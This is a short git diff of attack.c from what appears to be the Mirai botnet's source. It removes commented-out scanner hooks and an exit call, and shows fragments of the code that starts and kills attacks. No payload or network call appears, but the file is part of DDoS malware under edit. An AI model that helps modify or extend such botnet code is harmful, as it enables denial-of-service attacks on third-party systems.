@@ -12,7 +12,6 @@
 #include "attack.h"
 #include "rand.h"
 #include "util.h"
-//#include "scanner.h"
 
 
 uint8_t methods_len = 0;
@@ -50,17 +49,12 @@ void attack_kill_all(void)
 #ifdef DEBUG
     printf("[attack] Killing all ongoing attacks\n");
 #endif
-
     for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
     {
         if (attack_ongoing[i] != 0)
             kill(attack_ongoing[i], 9);
         attack_ongoing[i] = 0;
     }
-
-#ifdef MIRAI_TELNET
-    //scanner_init();
-#endif
 }
 
 void attack_parse(char *buf, int len)
@@ -192,9 +186,6 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
 #ifdef DEBUG
                 printf("[attack]...exit\n");
 #endif
-
-        //just bail if the function returns
-        //exit(0);
     }
 }
 
